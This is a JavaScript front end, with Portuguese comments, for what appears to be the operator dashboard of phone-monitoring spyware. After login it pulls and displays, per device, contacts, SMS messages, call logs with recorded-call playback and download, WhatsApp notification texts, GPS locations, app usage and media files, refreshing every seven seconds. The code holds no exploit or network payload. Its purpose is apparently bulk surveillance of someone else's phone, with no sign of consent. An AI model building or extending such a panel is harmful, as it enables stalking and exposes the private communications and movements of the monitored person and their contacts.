// main.js - painel atualizado
// Espera endpoints REST:
// GET /api/contacts?q=&limit=&skip=    -> lista de contacts [{ name, number, deviceId }]
// GET /api/sms
// GET /api/call
// GET /api/whatsapp
// GET /api/location
// GET /api/app-usage
// GET /api/media  -> retorna lista de media docs; cada media deve incluir metadata (JSON string or object) e _id, filename
// GET /api/media/:id -> retorna blob do ficheiro
// POST /api/auth/login, /api/auth/register

const api = {
  post: async (path, body, token) => {
    try {
      const res = await fetch(path, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', ...(token?{ Authorization: 'Bearer ' + token }: {}) },
        body: JSON.stringify(body)
      });
      return await res.json();
    } catch (e) {
      console.error('POST error', path, e);
      return null;
    }
  },
  get: async (path, token) => {
    try {
      const res = await fetch(path, {
        headers: { ...(token?{ Authorization: 'Bearer ' + token }: {}) }
      });
      if (!res.ok) {
        console.warn('GET non-ok', path, res.status);
        return [];
      }
      return await res.json();
    } catch (e) {
      console.error('GET error', path, e);
      return [];
    }
  },
  getWithQuery: async (path, params, token) => {
    try {
      const qs = new URLSearchParams(params || {}).toString();
      return await api.get(path + (qs ? ('?' + qs) : ''), token);
    } catch (e) {
      console.error('getWithQuery error', e);
      return [];
    }
  }
};

// local storage keys
const tokenKey = 'monitor_jwt';
const userKey = 'monitor_user';
function setLoggedIn(user, token) {
  localStorage.setItem(tokenKey, token);
  localStorage.setItem(userKey, JSON.stringify(user));
  document.getElementById('loginBox').classList.add('hidden');
  document.getElementById('dashboard').classList.remove('hidden');
  document.getElementById('btnLogout').classList.remove('hidden');
  document.getElementById('userName').innerText = user ? user.username : '';
  startAutoRefresh();
}
function logout() {
  localStorage.removeItem(tokenKey);
  localStorage.removeItem(userKey);
  location.reload();
}
function getToken(){ return localStorage.getItem(tokenKey); }
function getUser(){ return JSON.parse(localStorage.getItem(userKey) || 'null'); }

// contacts cache and media index
let contactsMap = {}; // normalized number -> name
let contactsListRaw = []; // for paging UI if needed
let mediaByCallId = {}; // callId -> [media objects]

// --- helpers for normalization & matching ---
function normalizeNumber(n) {
  if (!n) return '';
  return n.toString().replace(/[^\d+]/g, '');
}
function lastNDigits(n, digits=7) {
  if (!n) return '';
  const s = normalizeNumber(n);
  return s.length <= digits ? s : s.slice(-digits);
}
function resolveNumberToName(number) {
  if (!number) return '(unknown)';
  const norm = normalizeNumber(number);
  // exact match
  if (contactsMap[norm]) return contactsMap[norm];
  // try suffix match (last 7 digits)
  const suf = lastNDigits(norm, 7);
  for (const key in contactsMap) {
    if (key.endsWith(suf)) return contactsMap[key] + ' (' + number + ')';
  }
  return number;
}

// --- load contacts & media index ---
async function loadContactsCache() {
  const token = getToken();
  if (!token) return;
  // load many contacts (limited server-side). adjust limit if needed.
  const contacts = await api.getWithQuery('/api/contacts', { limit: 5000 }, token) || [];
  contactsMap = {};
  contactsListRaw = contacts;
  contacts.forEach(c => {
    if (c.number) {
      contactsMap[ normalizeNumber(c.number) ] = c.name || c.number;
    }
  });
}

async function loadMediaIndex() {
  const token = getToken();
  if (!token) return;
  const media = await api.get('/api/media', token) || [];
  mediaByCallId = {};
  media.forEach(m => {
    // metadata may be stored either as m.metadata (string or object) or m.meta
    let meta = {};
    if (m.metadata) {
      if (typeof m.metadata === 'string') {
        try { meta = JSON.parse(m.metadata); } catch(e) { meta = {}; }
      } else if (typeof m.metadata === 'object') meta = m.metadata;
    } else if (m.meta) {
      if (typeof m.meta === 'string') {
        try { meta = JSON.parse(m.meta); } catch(e) { meta = {}; }
      } else if (typeof m.meta === 'object') meta = m.meta;
    }
    const callId = meta.callId || meta.call_id || (meta.call ? meta.call : null);
    if (callId) {
      mediaByCallId[callId] = mediaByCallId[callId] || [];
      mediaByCallId[callId].push({ id: m._id, filename: m.filename || m._id, meta, mime: m.contentType || m.mimetype || 'audio/*' });
    }
  });
}

// --- renderers ---

// CONTACTS pagination
let contactsPage = 1;
const CONTACTS_PAGE_SIZE = 200;
document.getElementById('btnSearchContacts').addEventListener('click', () => { contactsPage = 1; renderContacts(); });
document.getElementById('btnPrevContacts').addEventListener('click', () => { if (contactsPage>1) { contactsPage--; renderContacts(); } });
document.getElementById('btnNextContacts').addEventListener('click', () => { contactsPage++; renderContacts(); });

async function renderContacts() {
  const token = getToken();
  if (!token) return;
  const q = document.getElementById('contactsQuery').value.trim();
  // prefer server-side query for performance; fallback to client filtering if server doesn't support
  let contacts = [];
  try {
    contacts = await api.getWithQuery('/api/contacts', { q: q || undefined, limit: CONTACTS_PAGE_SIZE, skip: (contactsPage-1)*CONTACTS_PAGE_SIZE }, token) || [];
  } catch(e) { contacts = []; }
  const list = document.getElementById('contactsList');
  list.innerHTML = '';
  if (!contacts || contacts.length === 0) {
    list.innerHTML = '<li>Nenhum contacto</li>'; return;
  }
  contacts.forEach(c => {
    const li = document.createElement('li');
    const left = document.createElement('div');
    left.innerHTML = `<strong>${escapeHtml(c.name||'(sem nome)')}</strong><div class="meta">${escapeHtml(c.number||'')}</div>`;
    const right = document.createElement('div');
    right.innerHTML = `<div class="small">device: ${escapeHtml(c.deviceId||'')}</div>`;
    li.appendChild(left);
    li.appendChild(right);
    list.appendChild(li);
  });
  document.getElementById('contactsPage').innerText = contactsPage;
}

// SMS
async function renderSms() {
  const token = getToken(); if (!token) return;
  const sms = await api.get('/api/sms', token) || [];
  const smsList = document.getElementById('smsList'); smsList.innerHTML = '';
  if (!sms.length) { smsList.innerHTML = '<li>Nenhum SMS</li>'; return; }
  sms.forEach(s => {
    const li = document.createElement('li');
    const left = document.createElement('div');
    left.innerHTML = `<strong>${escapeHtml(s.sender||'(unknown)')}</strong>: ${escapeHtml(s.message||'')}`;
    const meta = document.createElement('div'); meta.className='meta';
    meta.textContent = `${new Date(s.timestamp || Date.now()).toLocaleString()}`;
    li.appendChild(left); li.appendChild(meta);
    smsList.appendChild(li);
  });
}

// CALLS
async function renderCalls() {
  const token = getToken(); if (!token) return;
  const calls = await api.get('/api/call', token) || [];
  const callsList = document.getElementById('callsList'); callsList.innerHTML = '';
  if (!calls.length) { callsList.innerHTML = '<li>Nenhuma chamada</li>'; return; }
  calls.forEach(c => {
    const li = document.createElement('li');
    const left = document.createElement('div');
    const number = c.number || null;
    const display = resolveNumberToName(number);
    const duration = c.duration ? `${Math.round((c.duration||0)/1000)}s` : '-';
    left.innerHTML = `<strong>${escapeHtml(display)}</strong><div class="meta">${escapeHtml(c.state||c.type||'')} • ${duration}</div>`;
    const right = document.createElement('div');

    // timestamp + device
    const ts = document.createElement('div'); ts.className='meta';
    ts.textContent = `${new Date(c.timestamp || Date.now()).toLocaleString()} [device:${c.deviceId || ''}]`;
    right.appendChild(ts);

    // show recording play/download if exists
    const callId = c._id || c.id || c._strId || null;
    if (callId && mediaByCallId[callId]) {
      mediaByCallId[callId].forEach(m => {
        const playBtn = document.createElement('button');
        playBtn.textContent = 'Play';
        playBtn.className = 'small';
        playBtn.addEventListener('click', () => playMedia(m.id, m.filename, m.mime));
        right.appendChild(playBtn);

        const dlBtn = document.createElement('button');
        dlBtn.textContent = 'Download';
        dlBtn.className = 'small';
        dlBtn.addEventListener('click', () => downloadMedia(m.id, m.filename));
        right.appendChild(dlBtn);
      });
    }
    li.appendChild(left);
    li.appendChild(right);
    callsList.appendChild(li);
  });
}

// NOTIFICATIONS
async function renderNotifs() {
  const token = getToken(); if (!token) return;
  const notifs = await api.get('/api/whatsapp', token) || [];
  const notifList = document.getElementById('notifList'); notifList.innerHTML = '';
  if (!notifs.length) { notifList.innerHTML = '<li>Nenhuma notificação</li>'; return; }
  notifs.forEach(n => {
    const li = document.createElement('li');
    li.innerHTML = `<div><strong>${escapeHtml(n.packageName||'')}</strong>: ${escapeHtml(n.message||'')}</div><div class="meta">${new Date(n.timestamp||Date.now()).toLocaleString()}</div>`;
    notifList.appendChild(li);
  });
}

// LOCATIONS
async function renderLocs() {
  const token = getToken(); if (!token) return;
  const locs = await api.get('/api/location', token) || [];
  const locList = document.getElementById('locList'); locList.innerHTML = '';
  if (!locs.length) { locList.innerHTML = '<li>Nenhuma localização</li>'; return; }
  locs.forEach(l => {
    const li = document.createElement('li');
    const lat = typeof l.lat === 'number' ? l.lat.toFixed(5) : l.lat;
    const lon = typeof l.lon === 'number' ? l.lon.toFixed(5) : l.lon;
    li.innerHTML = `<div>${escapeHtml(lat)}, ${escapeHtml(lon)} <span class="meta">(${l.accuracy||'?'})</span></div><div class="meta">${new Date(l.timestamp||Date.now()).toLocaleString()} • device: ${escapeHtml(l.deviceId||'')}</div>`;
    locList.appendChild(li);
  });
}

// USAGE
async function renderUsage() {
  const token = getToken(); if (!token) return;
  const usage = await api.get('/api/app-usage', token) || [];
  const usageList = document.getElementById('usageList'); usageList.innerHTML = '';
  if (!usage.length) { usageList.innerHTML = '<li>Nenhum uso registado</li>'; return; }
  usage.forEach(u => {
    const li = document.createElement('li');
    li.innerHTML = `<div>${escapeHtml(u.packageName || '')} <span class="meta">(${u.totalTime || 0}ms)</span></div><div class="meta">last: ${new Date(u.lastTimeUsed || Date.now()).toLocaleString()}</div>`;
    usageList.appendChild(li);
  });
}

// MEDIA (list)
async function renderMedia() {
  const token = getToken(); if (!token) return;
  const media = await api.get('/api/media', token) || [];
  const mediaList = document.getElementById('mediaList'); mediaList.innerHTML = '';
  if (!media.length) { mediaList.innerHTML = '<li>Nenhum ficheiro</li>'; return; }
  media.forEach(m => {
    const li = document.createElement('li');
    li.innerHTML = `<div><strong>${escapeHtml(m.filename || m._id)}</strong></div>`;
    const right = document.createElement('div');
    const playBtn = document.createElement('button'); playBtn.textContent = 'Play'; playBtn.className='small';
    playBtn.addEventListener('click', () => playMedia(m._id, m.filename || m._id, m.contentType||m.mimetype));
    const dlBtn = document.createElement('button'); dlBtn.textContent='Download'; dlBtn.className='small';
    dlBtn.addEventListener('click', () => downloadMedia(m._id, m.filename || m._id));
    right.appendChild(playBtn); right.appendChild(dlBtn);
    li.appendChild(right);
    mediaList.appendChild(li);
  });
}

// --- media helpers ---
async function playMedia(id, filename, mime) {
  try {
    const token = getToken(); if (!token) return alert('Not authenticated');
    const res = await fetch('/api/media/' + id, { headers: { Authorization: 'Bearer ' + token } });
    if (!res.ok) return alert('Erro no download');
    const blob = await res.blob();
    const url = URL.createObjectURL(blob);
    showPlayerPopup(url, filename);
  } catch (e) {
    console.error('playMedia error', e); alert('Erro ao reproduzir');
  }
}

function showPlayerPopup(url, title) {
  const popup = document.createElement('div'); popup.className = 'playerPopup';
  const h = document.createElement('div'); h.innerHTML = `<strong>${escapeHtml(title)}</strong>`;
  const audio = document.createElement('audio'); audio.controls = true; audio.src = url; audio.autoplay = true;
  const close = document.createElement('button'); close.textContent = 'Fechar'; close.className='closeBtn';
  close.addEventListener('click', () => { audio.pause(); audio.src=''; URL.revokeObjectURL(url); popup.remove(); });
  popup.appendChild(h); popup.appendChild(audio); popup.appendChild(close);
  document.body.appendChild(popup);
}

async function downloadMedia(id, filename) {
  try {
    const token = getToken(); if (!token) return alert('Not authenticated');
    const res = await fetch('/api/media/' + id, { headers: { Authorization: 'Bearer ' + token } });
    if (!res.ok) return alert('Download failed');
    const blob = await res.blob();
    const a = document.createElement('a'); const url = URL.createObjectURL(blob);
    a.href = url; a.download = filename || 'file'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
  } catch (e) { console.error('download error', e); alert('Erro no download'); }
}

// --- orchestration ---
async function renderAll() {
  await loadContactsCache();
  await loadMediaIndex();
  await Promise.all([ renderContacts(), renderSms(), renderCalls(), renderNotifs(), renderLocs(), renderUsage(), renderMedia() ]);
}

function startAutoRefresh() {
  renderAll();
  if (window.__monitorInterval) clearInterval(window.__monitorInterval);
  window.__monitorInterval = setInterval(renderAll, 7000);
}

// --- login UI wiring ---
document.getElementById('btnLogin').addEventListener('click', async () => {
  const u = document.getElementById('username').value.trim();
  const p = document.getElementById('password').value;
  if (!u || !p) { document.getElementById('loginMsg').innerText = 'Preencha usuário e senha'; return; }
  const r = await api.post('/api/auth/login', { username: u, password: p });
  if (r && r.token) {
    setLoggedIn(r.user, r.token);
  } else {
    document.getElementById('loginMsg').innerText = (r && r.error) ? r.error : 'Erro no login';
  }
});
document.getElementById('btnRegister').addEventListener('click', async () => {
  const u = document.getElementById('username').value.trim();
  const p = document.getElementById('password').value;
  if (!u || !p) { document.getElementById('loginMsg').innerText = 'Preencha usuário e senha'; return; }
  const r = await api.post('/api/auth/register', { username: u, password: p });
  document.getElementById('loginMsg').innerText = (r && r.ok) ? 'Registado — faça login' : ((r && r.error) ? r.error : 'Erro no registo');
});
document.getElementById('btnLogout').addEventListener('click', logout);

// show dashboard if already logged in
window.addEventListener('load', () => {
  const token = getToken();
  if (token) {
    const user = getUser();
    document.getElementById('loginBox').classList.add('hidden');
    document.getElementById('dashboard').classList.remove('hidden');
    document.getElementById('btnLogout').classList.remove('hidden');
    document.getElementById('userName').innerText = user ? user.username : '';
    startAutoRefresh();
  }
});

// small util
function escapeHtml(s) {
  if (!s) return '';
  return s.toString().replace(/[&<>"']/g, (m) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
}
